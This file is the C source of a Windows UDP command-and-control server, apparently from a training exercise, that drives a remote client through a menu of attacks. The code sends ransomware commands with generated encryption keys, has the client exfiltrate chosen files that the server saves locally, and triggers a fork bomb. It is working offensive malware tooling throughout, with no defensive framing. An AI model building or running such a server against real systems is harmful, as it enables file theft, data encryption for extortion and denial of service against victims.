/*
 * =====================================================================================
 *
 *       Filename:  main.c
 *
 *    Description:  Programme principal
 *
 *        Version:  1.0
 *        Created:  18/12/2024
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Valentin Pizzio
 *   Organization:  
 *
 * =====================================================================================
 */

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <direct.h>
#include <io.h>
#include "protocol.h"

#pragma comment(lib, "ws2_32.lib")

#define PORT 4242
#define BUFFER_SIZE 1024
#define MAX_FILENAME_LENGTH 256
#define PROJECT_ROOT "c:\\Users\\user\\Documents\\Exercice3"
#define LOGS_DIR PROJECT_ROOT "\\logs"
#define LOG_FILE PROJECT_ROOT "\\logs\\server_log.txt"
#define KEYS_FILE PROJECT_ROOT "\\logs\\ransomware_keys.log"
#define EXFILTRATION_DIR PROJECT_ROOT "\\exfiltration_result"

// Function to ensure exfiltration directory exists
void ensure_exfiltration_dir() {
    CreateDirectory(EXFILTRATION_DIR, NULL);
}

// Function to ensure logs directory exists
void ensure_logs_dir() {
    CreateDirectory(LOGS_DIR, NULL);
}

// Function to log an interaction
void log_interaction(const char* client_id, const char* action, const char* details) {
    FILE* log_file = fopen(LOG_FILE, "a");
    if (!log_file) {
        printf("Error: Cannot open log file\n");
        return;
    }

    time_t now;
    time(&now);
    struct tm* t = localtime(&now);
    
    fprintf(log_file, "[%04d-%02d-%02d %02d:%02d:%02d] Client %s - %s: %s\n",
            t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
            t->tm_hour, t->tm_min, t->tm_sec,
            client_id, action, details);
    
    fclose(log_file);
}

// Function to save exfiltrated content
void save_exfiltrated_content(const char* client_id, const char* filename, const char* content) {
    char filepath[MAX_PATH];
    char basename[MAX_FILENAME_LENGTH];
    char *dot = strrchr(filename, '.');
    
    // Extract basename without extension
    if (dot) {
        size_t len = dot - filename;
        strncpy(basename, filename, len);
        basename[len] = '\0';
    } else {
        strcpy(basename, filename);
    }

    // Create filename with timestamp
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    snprintf(filepath, sizeof(filepath), "%s\\%s_%s_%02d%02d%02d%02d%02d%02d%s",
             EXFILTRATION_DIR, basename, client_id,
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
             t->tm_hour, t->tm_min, t->tm_sec,
             dot ? dot : "");

    // Save content to file
    FILE *file = fopen(filepath, "w");
    if (file) {
        fprintf(file, "Client ID: %s\n", client_id);
        fprintf(file, "Original filename: %s\n", filename);
        fprintf(file, "Timestamp: %04d-%02d-%02d %02d:%02d:%02d\n\n",
                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                t->tm_hour, t->tm_min, t->tm_sec);
        fprintf(file, "Content:\n%s", content);
        fclose(file);
        printf("Exfiltrated content saved to: %s\n", filepath);
    } else {
        printf("Failed to save exfiltrated content to: %s\n", filepath);
    }
}

// Function to generate random key
void generate_key(char *key, int length) {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    for (int i = 0; i < length; i++) {
        key[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    key[length] = '\0';
}

// Function to log encryption key
void log_key(const char* client_id, const char* key) {
    FILE* log_file = fopen(KEYS_FILE, "a");
    if (!log_file) {
        printf("Error: Cannot open key log file\n");
        return;
    }

    time_t now;
    time(&now);
    struct tm* t = localtime(&now);
    
    fprintf(log_file, "[%04d-%02d-%02d %02d:%02d:%02d] Client %s - Key: %s\n",
            t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
            t->tm_hour, t->tm_min, t->tm_sec,
            client_id, key);
    
    fclose(log_file);
}

// Function to list files in parent directory
void list_files(char* buffer, size_t buffer_size) {
    WIN32_FIND_DATA findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char search_path[MAX_PATH];
    int count = 1;

    buffer[0] = '\0';
    char line[256];

    // List files in parent directory
    snprintf(search_path, sizeof(search_path), "..\\*");
    hFind = FindFirstFile(search_path, &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                    snprintf(line, sizeof(line), "%d. %s\n", count++, findData.cFileName);
                    strncat(buffer, line, buffer_size - strlen(buffer) - 1);
                }
            }
        } while (FindNextFile(hFind, &findData) != 0 && strlen(buffer) < buffer_size - 100);
        FindClose(hFind);
    }
}

// Function to list directories
void list_directories(char* buffer, size_t buffer_size) {
    WIN32_FIND_DATA findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char search_path[MAX_PATH];
    int count = 1;

    buffer[0] = '\0';
    strcat(buffer, "Available directories:\n");
    char line[256];

    // List directories in parent directory
    snprintf(search_path, sizeof(search_path), "..\\*");
    hFind = FindFirstFile(search_path, &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                strcmp(findData.cFileName, ".") != 0 && 
                strcmp(findData.cFileName, "..") != 0 &&
                strcmp(findData.cFileName, "build") != 0 &&
                strcmp(findData.cFileName, "logs") != 0) {
                snprintf(line, sizeof(line), "%d. %s\n", count++, findData.cFileName);
                strncat(buffer, line, buffer_size - strlen(buffer) - 1);
            }
        } while (FindNextFile(hFind, &findData) != 0 && strlen(buffer) < buffer_size - 100);
        FindClose(hFind);
    }
}

void print_menu() {
    printf("\nAvailable commands:\n");
    printf("1. Ransomware\n");
    printf("2. Exfiltration\n");
    printf("3. Fork\n");
    printf("4. Out\n");
    printf("Enter command number: ");
    fflush(stdout);
}

void clear_stdin() {
    int c;
    while ((c = getchar()) != '\n' && c != EOF);
}

int main() {
    srand((unsigned int)time(NULL));
    ensure_exfiltration_dir();
    ensure_logs_dir();
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return 1;
    }

    log_interaction("SERVER", "START", "Server started");

    SOCKET socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (socket_fd == INVALID_SOCKET) {
        printf("Error creating socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    struct sockaddr_in server_addr, client_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed: %d\n", WSAGetLastError());
        closesocket(socket_fd);
        WSACleanup();
        return 1;
    }

    printf("Server listening on UDP port %d...\n", PORT);
    log_interaction("SERVER", "LISTEN", "Server listening on UDP port 4242");

    char current_client_id[ID_LENGTH + 1] = {0};
    int first_connection = 1;
    int addr_size = sizeof(client_addr);

    while (1) {
        if (first_connection) {
            Message msg;
            memset(&msg, 0, sizeof(Message));
            recvfrom(socket_fd, (char*)&msg, sizeof(Message), 0,
                    (struct sockaddr*)&client_addr, &addr_size);
            strncpy(current_client_id, msg.client_id, ID_LENGTH);
            printf("\nClient connected with ID: %s\n", current_client_id);
            
            char log_msg[256];
            snprintf(log_msg, sizeof(log_msg), "New client connected from %s:%d",
                    inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
            log_interaction(current_client_id, "CONNECT", log_msg);
            
            first_connection = 0;
        }

        printf("\nAvailable commands:\n");
        printf("1. Ransomware\n");
        printf("2. Exfiltration\n");
        printf("3. Fork\n");
        printf("4. Out\n");
        printf("Enter command number: ");

        int choice;
        if (scanf("%d", &choice) != 1) {
            clear_stdin();
            printf("Invalid input. Please enter a number.\n");
            log_interaction(current_client_id, "ERROR", "Invalid command input");
            continue;
        }
        clear_stdin();

        if (choice < 1 || choice > 4) {
            printf("Invalid command number\n");
            log_interaction(current_client_id, "ERROR", "Invalid command number");
            continue;
        }

        Message msg;
        memset(&msg, 0, sizeof(Message));
        strncpy(msg.client_id, current_client_id, ID_LENGTH);

        if (choice == 2) {  // Exfiltration
            log_interaction(current_client_id, "COMMAND", "Exfiltration requested");
            
            char buffer[BUFFER_SIZE];
            list_files(buffer, BUFFER_SIZE);
            msg.cmd = CMD_LIST_FILES;
            strcpy(msg.data, buffer);
            sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                  (struct sockaddr*)&client_addr, sizeof(client_addr));

            memset(&msg, 0, sizeof(Message));
            recvfrom(socket_fd, (char*)&msg, sizeof(Message), 0,
                    (struct sockaddr*)&client_addr, &addr_size);

            printf("\n%s", msg.data);
            printf("Enter the number of the file to exfiltrate: ");
            int file_choice;
            scanf("%d", &file_choice);
            clear_stdin();

            char chosen_file[MAX_FILENAME_LENGTH] = "";
            WIN32_FIND_DATA findData;
            HANDLE hFind = FindFirstFile("../*", &findData);
            int count = 0;

            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        count++;
                        if (count == file_choice) {
                            strncpy(chosen_file, findData.cFileName, MAX_FILENAME_LENGTH - 1);
                            break;
                        }
                    }
                } while (FindNextFile(hFind, &findData));
                FindClose(hFind);
            }

            if (chosen_file[0] != '\0') {
                char log_msg[256];
                snprintf(log_msg, sizeof(log_msg), "Exfiltrating file: %s", chosen_file);
                log_interaction(current_client_id, "EXFILTRATE", log_msg);

                memset(&msg, 0, sizeof(Message));
                strncpy(msg.client_id, current_client_id, ID_LENGTH);
                msg.cmd = CMD_EXFIL_FILE;
                strncpy(msg.filename, chosen_file, MAX_FILENAME_LENGTH - 1);
                sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                      (struct sockaddr*)&client_addr, sizeof(client_addr));

                memset(&msg, 0, sizeof(Message));
                recvfrom(socket_fd, (char*)&msg, sizeof(Message), 0,
                        (struct sockaddr*)&client_addr, &addr_size);
                
                save_exfiltrated_content(msg.client_id, msg.filename, msg.data);
                printf("Exfiltrated content saved to: exfiltration_result\\target_%s_%s.txt\n", 
                       msg.client_id, msg.filename);

                snprintf(log_msg, sizeof(log_msg), "File %s exfiltrated successfully", chosen_file);
                log_interaction(current_client_id, "SUCCESS", log_msg);

                printf("\nPress Enter to continue...");
                getchar();
            } else {
                printf("Invalid file number\n");
                log_interaction(current_client_id, "ERROR", "Invalid file number for exfiltration");
            }
        } else if (choice == 1) {  // Ransomware
            log_interaction(current_client_id, "COMMAND", "Ransomware requested");
            
            printf("\nAvailable directories:\n");
            char buffer[BUFFER_SIZE];
            list_directories(buffer, BUFFER_SIZE);
            printf("%s", buffer);

            printf("Enter the number of the directory to encrypt: ");
            int dir_choice;
            scanf("%d", &dir_choice);
            clear_stdin();

            char chosen_dir[MAX_FILENAME_LENGTH] = "";
            WIN32_FIND_DATA findData;
            HANDLE hFind = FindFirstFile("../*", &findData);
            int count = 0;
            
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                            count++;
                            if (count == dir_choice) {
                                strncpy(chosen_dir, findData.cFileName, MAX_FILENAME_LENGTH - 1);
                                break;
                            }
                        }
                    }
                } while (FindNextFile(hFind, &findData));
                FindClose(hFind);
            }

            if (chosen_dir[0] != '\0') {
                char key[KEY_LENGTH + 1];
                generate_key(key, KEY_LENGTH);
                log_key(current_client_id, key);
                printf("Generated encryption key: %s\n", key);

                char log_msg[256];
                snprintf(log_msg, sizeof(log_msg), "Encrypting directory: %s with key: %s", chosen_dir, key);
                log_interaction(current_client_id, "RANSOMWARE", log_msg);

                strncpy(msg.filename, chosen_dir, MAX_FILENAME_LENGTH - 1);
                strncpy(msg.data, key, KEY_LENGTH);
                msg.cmd = CMD_RANSOMWARE;
                
                sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                      (struct sockaddr*)&client_addr, sizeof(client_addr));

                memset(&msg, 0, sizeof(Message));
                recvfrom(socket_fd, (char*)&msg, sizeof(Message), 0,
                        (struct sockaddr*)&client_addr, &addr_size);
                printf("Client response: %s\n", msg.data);

                snprintf(log_msg, sizeof(log_msg), "Ransomware execution completed: %s", msg.data);
                log_interaction(current_client_id, "SUCCESS", log_msg);

                printf("\nPress Enter to continue...");
                getchar();
            } else {
                printf("Invalid directory number\n");
                log_interaction(current_client_id, "ERROR", "Invalid directory number for ransomware");
            }
        } else {
            msg.cmd = (Command)choice;
            
            const char* cmd_name = (choice == 3) ? "Fork" : "Out";
            log_interaction(current_client_id, "COMMAND", cmd_name);

            if (choice == 4) {
                printf("Client disconnected. Waiting for new client...\n");
                log_interaction(current_client_id, "DISCONNECT", "Client disconnected");
                first_connection = 1;
                continue;
            }

            sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                  (struct sockaddr*)&client_addr, sizeof(client_addr));

            if (choice == 3) {
                memset(&msg, 0, sizeof(Message));
                recvfrom(socket_fd, (char*)&msg, sizeof(Message), 0,
                        (struct sockaddr*)&client_addr, &addr_size);
                printf("Client response: %s\n", msg.data);
                
                log_interaction(current_client_id, "FORK", "Fork bomb executed");
                
                printf("\nPress Enter to continue...");
                getchar();
            }
        }
    }

    closesocket(socket_fd);
    WSACleanup();
    log_interaction("SERVER", "STOP", "Server stopped");
    return 0;
}